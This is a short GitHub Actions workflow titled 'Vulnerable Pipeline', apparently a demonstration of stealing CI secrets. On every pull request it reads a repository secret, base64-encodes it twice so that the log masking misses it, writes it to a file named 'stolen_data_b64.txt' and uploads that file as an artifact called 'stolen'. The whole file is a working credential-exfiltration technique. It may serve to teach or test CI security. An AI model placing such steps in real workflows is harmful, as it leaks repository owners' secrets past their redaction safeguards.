name: Vulnerable Pipeline

on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest

    env:
      DEMO_SECRET: ${{ secrets.DEMO_SECRET }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Normal step
        run: echo "Pipeline started"

      - name: Encode 2x and store
        run: |
          encoded=$(echo -n "${{ secrets.DEMO_SECRET }}" | base64 | base64)
          echo -n "$encoded" > stolen_data_b64.txt
        shell: bash

      - uses: actions/upload-artifact@v4
        with:
          name: stolen
          path: stolen_data_b64.txt
